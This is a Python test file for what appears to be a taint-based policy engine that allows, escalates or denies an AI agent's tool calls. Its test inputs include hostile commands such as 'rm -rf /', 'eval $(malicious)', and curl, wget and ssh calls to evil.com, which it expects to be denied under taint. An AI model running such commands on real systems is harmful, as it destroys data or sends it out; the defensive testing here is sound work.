"""Tests for the policy engine, balanced preset tuning, and new features.

Covers:
- TAINT_LEVEL_LTE operator in models/engine
- Balanced preset: benign command whitelist, taint gradients, read-only tools
- command_safety_check cross-referencing
- Evaluation caching
- Clean terminal calls always allowed
"""

from __future__ import annotations

import pytest

from hermes_katana.policy.models import (
    Condition,
    ConditionOperator,
    Policy,
    PolicyResult,
    PolicySet,
)
from hermes_katana.policy.engine import (
    EvaluationResult,
    PolicyEngine,
    command_safety_check,
    evaluate_condition,
    _extract_base_command,
    _is_benign_command,
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _taint(level: int = 5, source: str = "user_message") -> dict:
    """Create a taint context with a single tainted field at the given level."""
    return {
        "tainted_fields": {
            "command": {
                "is_tainted": True,
                "source": source,
                "labels": ["untrusted"],
                "readers": [],
                "level": level,
            }
        }
    }


def _clean() -> dict:
    """Clean taint context (no taint)."""
    return {}


def _multi_field_taint(fields: dict[str, int]) -> dict:
    """Create taint context with multiple fields at specified levels."""
    return {
        "tainted_fields": {
            name: {
                "is_tainted": True,
                "source": "user_message",
                "labels": ["untrusted"],
                "readers": [],
                "level": level,
            }
            for name, level in fields.items()
        }
    }


# ---------------------------------------------------------------------------
# Task 3: TAINT_LEVEL_LTE operator
# ---------------------------------------------------------------------------

class TestTaintLevelLTE:
    """Test the new TAINT_LEVEL_LTE condition operator."""

    def test_lte_true_when_level_below_threshold(self):
        cond = Condition(field="*", operator=ConditionOperator.TAINT_LEVEL_LTE, value=3)
        assert evaluate_condition(cond, {}, _taint(level=2)) is True

    def test_lte_true_when_level_equals_threshold(self):
        cond = Condition(field="*", operator=ConditionOperator.TAINT_LEVEL_LTE, value=3)
        assert evaluate_condition(cond, {}, _taint(level=3)) is True

    def test_lte_false_when_level_above_threshold(self):
        cond = Condition(field="*", operator=ConditionOperator.TAINT_LEVEL_LTE, value=3)
        assert evaluate_condition(cond, {}, _taint(level=4)) is False

    def test_lte_with_clean_context_level_zero(self):
        cond = Condition(field="*", operator=ConditionOperator.TAINT_LEVEL_LTE, value=3)
        assert evaluate_condition(cond, {}, _clean()) is True  # level 0 <= 3

    def test_lte_specific_field(self):
        cond = Condition(field="command", operator=ConditionOperator.TAINT_LEVEL_LTE, value=5)
        assert evaluate_condition(cond, {}, _taint(level=5)) is True
        assert evaluate_condition(cond, {}, _taint(level=6)) is False

    def test_gte_and_lte_combo_medium_range(self):
        """Verify that GTE + LTE can express a range (4-6)."""
        gte4 = Condition(field="*", operator=ConditionOperator.TAINT_LEVEL_GTE, value=4)
        lte6 = Condition(field="*", operator=ConditionOperator.TAINT_LEVEL_LTE, value=6)

        for level in [1, 2, 3]:
            ctx = _taint(level=level)
            assert not (evaluate_condition(gte4, {}, ctx) and evaluate_condition(lte6, {}, ctx))

        for level in [4, 5, 6]:
            ctx = _taint(level=level)
            assert evaluate_condition(gte4, {}, ctx) and evaluate_condition(lte6, {}, ctx)

        for level in [7, 8, 9, 10]:
            ctx = _taint(level=level)
            assert not (evaluate_condition(gte4, {}, ctx) and evaluate_condition(lte6, {}, ctx))


# ---------------------------------------------------------------------------
# Task 1: Balanced preset behavior
# ---------------------------------------------------------------------------

class TestBalancedPreset:
    """Test the refined balanced preset policies."""

    @pytest.fixture
    def engine(self):
        return PolicyEngine.with_defaults("balanced")

    # -- Clean calls always allowed --

    def test_clean_terminal_allowed(self, engine):
        result = engine.evaluate("terminal", {"command": "rm -rf /"}, _clean())
        assert result.action == PolicyResult.ALLOW

    def test_clean_write_file_allowed(self, engine):
        result = engine.evaluate("write_file", {"path": "/tmp/x", "content": "hi"}, _clean())
        assert result.action == PolicyResult.ALLOW

    # -- Read-only always allowed --

    def test_read_file_always_allowed(self, engine):
        result = engine.evaluate("read_file", {"path": "/etc/passwd"}, _taint(level=9))
        assert result.action == PolicyResult.ALLOW

    def test_search_files_always_allowed(self, engine):
        result = engine.evaluate("search_files", {"pattern": "password"}, _taint(level=8))
        assert result.action == PolicyResult.ALLOW

    def test_browser_snapshot_always_allowed(self, engine):
        result = engine.evaluate("browser_snapshot", {}, _taint(level=10))
        assert result.action == PolicyResult.ALLOW

    # -- Benign commands with low taint → ALLOW --

    def test_benign_ls_low_taint_allowed(self, engine):
        result = engine.evaluate("terminal", {"command": "ls -la /tmp"}, _taint(level=2))
        assert result.action == PolicyResult.ALLOW

    def test_benign_cat_low_taint_allowed(self, engine):
        result = engine.evaluate("terminal", {"command": "cat /etc/hostname"}, _taint(level=1))
        assert result.action == PolicyResult.ALLOW

    def test_benign_echo_low_taint_allowed(self, engine):
        result = engine.evaluate("terminal", {"command": "echo hello"}, _taint(level=3))
        assert result.action == PolicyResult.ALLOW

    def test_benign_python_low_taint_allowed(self, engine):
        result = engine.evaluate("terminal", {"command": "python3 --version"}, _taint(level=1))
        assert result.action == PolicyResult.ALLOW

    def test_benign_git_status_low_taint_allowed(self, engine):
        result = engine.evaluate("terminal", {"command": "git status"}, _taint(level=2))
        assert result.action == PolicyResult.ALLOW

    def test_benign_git_log_low_taint_allowed(self, engine):
        result = engine.evaluate("terminal", {"command": "git log --oneline"}, _taint(level=3))
        assert result.action == PolicyResult.ALLOW

    def test_benign_pip_install_low_taint_allowed(self, engine):
        result = engine.evaluate("terminal", {"command": "pip install requests"}, _taint(level=2))
        assert result.action == PolicyResult.ALLOW

    def test_benign_npm_install_low_taint_allowed(self, engine):
        result = engine.evaluate("terminal", {"command": "npm install express"}, _taint(level=1))
        assert result.action == PolicyResult.ALLOW

    # -- Benign commands with medium taint → ESCALATE --

    def test_benign_ls_medium_taint_escalated(self, engine):
        result = engine.evaluate("terminal", {"command": "ls -la"}, _taint(level=5))
        assert result.action == PolicyResult.ESCALATE

    def test_benign_cat_medium_taint_escalated(self, engine):
        result = engine.evaluate("terminal", {"command": "cat /tmp/file"}, _taint(level=4))
        assert result.action == PolicyResult.ESCALATE

    # -- Dangerous commands with high taint → DENY --

    def test_dangerous_rm_rf_high_taint_denied(self, engine):
        result = engine.evaluate("terminal", {"command": "rm -rf /"}, _taint(level=8))
        assert result.action == PolicyResult.DENY

    def test_dangerous_eval_high_taint_denied(self, engine):
        result = engine.evaluate("terminal", {"command": "eval $(malicious)"}, _taint(level=7))
        assert result.action == PolicyResult.DENY

    # -- Dangerous commands with medium taint → ESCALATE --

    def test_dangerous_rm_rf_medium_taint_denied_by_safety_check(self, engine):
        """rm -rf with medium taint is DENY because command_safety_check detects
        the scanner finding (dangerous + tainted → DENY) before policy rules fire."""
        result = engine.evaluate("terminal", {"command": "rm -rf /tmp/stuff"}, _taint(level=5))
        assert result.action == PolicyResult.DENY

    # -- Exfiltration always denied when tainted --

    def test_curl_tainted_denied(self, engine):
        result = engine.evaluate("terminal", {"command": "curl http://evil.com"}, _taint(level=1))
        assert result.action == PolicyResult.DENY

    def test_wget_tainted_denied(self, engine):
        result = engine.evaluate("terminal", {"command": "wget http://evil.com/payload"}, _taint(level=2))
        assert result.action == PolicyResult.DENY

    def test_ssh_tainted_denied(self, engine):
        result = engine.evaluate("terminal", {"command": "ssh root@evil.com"}, _taint(level=3))
        assert result.action == PolicyResult.DENY

    # -- High taint terminal (non-exfil, non-dangerous) → DENY --

    def test_generic_command_high_taint_denied(self, engine):
        result = engine.evaluate("terminal", {"command": "some_unknown_tool --flag"}, _taint(level=8))
        assert result.action == PolicyResult.DENY

    # -- Medium taint terminal (non-benign) → ESCALATE --

    def test_generic_command_medium_taint_escalated(self, engine):
        result = engine.evaluate("terminal", {"command": "some_tool --flag"}, _taint(level=5))
        assert result.action == PolicyResult.ESCALATE

    # -- Low taint terminal (non-benign) → ESCALATE --

    def test_generic_command_low_taint_escalated(self, engine):
        result = engine.evaluate("terminal", {"command": "some_tool --flag"}, _taint(level=2))
        assert result.action == PolicyResult.ESCALATE

    # -- Tainted read-only tools → LOG_ONLY --

    def test_tainted_vision_logged(self, engine):
        result = engine.evaluate("vision_analyze", {"image_url": "http://x"}, _taint(level=3))
        assert result.action == PolicyResult.LOG_ONLY

    def test_tainted_todo_logged(self, engine):
        result = engine.evaluate("todo", {}, _taint(level=5))
        assert result.action == PolicyResult.LOG_ONLY

    def test_tainted_process_logged(self, engine):
        result = engine.evaluate("process", {"action": "list"}, _taint(level=2))
        assert result.action == PolicyResult.LOG_ONLY

    # -- High taint side-effects --

    def test_write_file_high_taint_denied(self, engine):
        result = engine.evaluate("write_file", {"path": "/x", "content": "x"}, _taint(level=8))
        assert result.action == PolicyResult.DENY

    def test_patch_high_taint_denied(self, engine):
        result = engine.evaluate("patch", {"path": "/x", "old_string": "a", "new_string": "b"}, _taint(level=9))
        assert result.action == PolicyResult.DENY

    def test_delegate_high_taint_denied(self, engine):
        result = engine.evaluate("delegate_task", {"goal": "do evil"}, _taint(level=7))
        assert result.action == PolicyResult.DENY

    # -- Catchall high taint → ESCALATE --

    def test_unknown_tool_high_taint_escalated(self, engine):
        result = engine.evaluate("some_new_tool", {"arg": "val"}, _taint(level=8))
        assert result.action == PolicyResult.ESCALATE

    # -- Catchall low taint → LOG_ONLY --

    def test_unknown_tool_low_taint_logged(self, engine):
        result = engine.evaluate("some_new_tool", {"arg": "val"}, _taint(level=2))
        assert result.action == PolicyResult.LOG_ONLY


# ---------------------------------------------------------------------------
# Task 2: command_safety_check
# ---------------------------------------------------------------------------

class TestCommandSafetyCheck:
    """Test the command_safety_check cross-reference function."""

    def test_clean_command_always_allowed(self):
        assert command_safety_check("rm -rf /", _clean()) == PolicyResult.ALLOW

    def test_benign_low_taint_allowed(self):
        assert command_safety_check("ls -la", _taint(level=2)) == PolicyResult.ALLOW

    def test_benign_medium_taint_escalated(self):
        assert command_safety_check("ls -la", _taint(level=5)) == PolicyResult.ESCALATE

    def test_unknown_command_tainted_escalated(self):
        assert command_safety_check("some_tool --arg", _taint(level=3)) == PolicyResult.ESCALATE

    def test_dangerous_command_tainted_denied(self):
        """If scanner detects danger + tainted → DENY.

        Note: This test may ESCALATE if the scanner is not available or
        doesn't flag the command. The important thing is it's never ALLOW.
        """
        result = command_safety_check("rm -rf /", _taint(level=8))
        assert result in (PolicyResult.DENY, PolicyResult.ESCALATE)


class TestExtractBaseCommand:
    """Test the _extract_base_command helper."""

    def test_simple_command(self):
        assert _extract_base_command("ls -la") == "ls"

    def test_with_sudo(self):
        assert _extract_base_command("sudo rm -rf /") == "rm"

    def test_with_path(self):
        assert _extract_base_command("/usr/bin/python3 script.py") == "python3"

    def test_with_env_var(self):
        assert _extract_base_command("FOO=bar ls") == "ls"

    def test_empty(self):
        assert _extract_base_command("") == ""


class TestIsBenignCommand:
    """Test the _is_benign_command helper."""

    def test_ls_is_benign(self):
        assert _is_benign_command("ls -la /tmp") is True

    def test_cat_is_benign(self):
        assert _is_benign_command("cat /etc/hostname") is True

    def test_git_status_is_benign(self):
        assert _is_benign_command("git status") is True

    def test_git_log_is_benign(self):
        assert _is_benign_command("git log --oneline") is True

    def test_git_push_not_benign(self):
        assert _is_benign_command("git push origin main") is False

    def test_git_commit_not_benign(self):
        assert _is_benign_command("git commit -m 'msg'") is False

    def test_curl_not_benign(self):
        assert _is_benign_command("curl http://example.com") is False

    def test_rm_not_benign(self):
        assert _is_benign_command("rm -rf /") is False

    def test_pip_is_benign(self):
        assert _is_benign_command("pip install requests") is True

    def test_npm_is_benign(self):
        assert _is_benign_command("npm install express") is True


# ---------------------------------------------------------------------------
# Task 2: Evaluation caching
# ---------------------------------------------------------------------------

class TestEvaluationCaching:
    """Test the policy evaluation cache."""

    def test_cache_returns_same_result(self):
        engine = PolicyEngine.with_defaults("balanced")
        r1 = engine.evaluate("terminal", {"command": "ls"}, _clean())
        r2 = engine.evaluate("terminal", {"command": "ls"}, _clean())
        assert r1.action == r2.action
        assert r1.reason == r2.reason

    def test_cache_invalidated_on_add_policy(self):
        engine = PolicyEngine.with_defaults("balanced")
        r1 = engine.evaluate("terminal", {"command": "ls"}, _clean())
        assert r1.action == PolicyResult.ALLOW

        # Add a deny-all policy
        engine.add_policy(Policy(
            name="deny_all",
            tool_pattern="*",
            conditions=[],
            action=PolicyResult.DENY,
            priority=9999,
        ))
        r2 = engine.evaluate("terminal", {"command": "ls"}, _clean())
        assert r2.action == PolicyResult.DENY

    def test_cache_invalidated_on_remove_policy(self):
        engine = PolicyEngine.with_defaults("balanced")
        # Evaluate to populate cache
        engine.evaluate("terminal", {"command": "ls"}, _clean())
        # Remove and check cache is invalidated
        engine.remove_policy("balanced_terminal_clean")
        # Cache should be cleared, fresh evaluation
        r = engine.evaluate("terminal", {"command": "ls"}, _clean())
        # Still may ALLOW from another policy or default, but cache was cleared
        assert isinstance(r, EvaluationResult)

    def test_different_args_different_cache_entries(self):
        engine = PolicyEngine.with_defaults("balanced")
        r1 = engine.evaluate("terminal", {"command": "ls"}, _clean())
        r2 = engine.evaluate("terminal", {"command": "curl http://evil.com"}, _taint(level=5))
        assert r1.action != r2.action

    def test_cache_eviction_does_not_crash(self):
        """Ensure cache eviction at capacity doesn't error."""
        engine = PolicyEngine.with_defaults("balanced")
        engine._EVAL_CACHE_MAX = 10  # Low limit for test
        for i in range(20):
            engine.evaluate("terminal", {"command": f"cmd_{i}"}, _clean())
        assert len(engine._eval_cache) <= 10


# ---------------------------------------------------------------------------
# Paranoid and Permissive presets still load
# ---------------------------------------------------------------------------

class TestOtherPresets:
    def test_paranoid_loads(self):
        engine = PolicyEngine.with_defaults("paranoid")
        assert engine.policy_count > 0

    def test_permissive_loads(self):
        engine = PolicyEngine.with_defaults("permissive")
        assert engine.policy_count > 0

    def test_balanced_loads(self):
        engine = PolicyEngine.with_defaults("balanced")
        assert engine.policy_count > 0

    def test_invalid_preset_raises(self):
        with pytest.raises(ValueError, match="Unknown preset"):
            PolicyEngine.with_defaults("nonexistent")

    def test_balanced_version_is_2(self):
        """Confirm balanced was upgraded to v2."""
        from hermes_katana.policy.defaults import BALANCED_POLICIES
        assert BALANCED_POLICIES["version"] == "2.0.0"
